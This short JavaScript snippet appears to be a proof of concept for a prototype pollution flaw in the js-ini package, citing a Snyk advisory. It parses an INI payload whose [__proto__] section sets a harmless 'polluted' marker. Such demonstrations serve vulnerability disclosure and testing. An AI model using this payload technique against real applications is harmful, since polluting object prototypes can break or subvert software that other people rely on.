//https://snyk.io/vuln/SNYK-JS-JSINI-1048970
var ini = require('js-ini')
const payload = '[__proto__]\npolluted = yes';
var parsed = ini.parse(payload);
  